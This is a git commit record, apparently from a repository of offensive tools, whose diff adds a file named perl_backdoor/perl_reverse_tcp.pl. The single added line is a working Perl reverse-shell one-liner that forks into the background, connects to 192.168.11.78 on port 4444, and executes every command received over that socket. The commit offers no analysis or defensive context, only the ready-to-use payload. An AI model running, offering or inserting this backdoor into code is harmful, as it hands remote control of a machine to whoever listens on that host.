4eb899aff72324303098b801c6ac3cdb9446b784
root <root@localhost.localdomain>
2018-04-04 07:06:42 -0500

    adding all files

---
+++ perl_backdoor/perl_reverse_tcp.pl
@@ -0,0 +1,1 @@
+perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.11.78:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
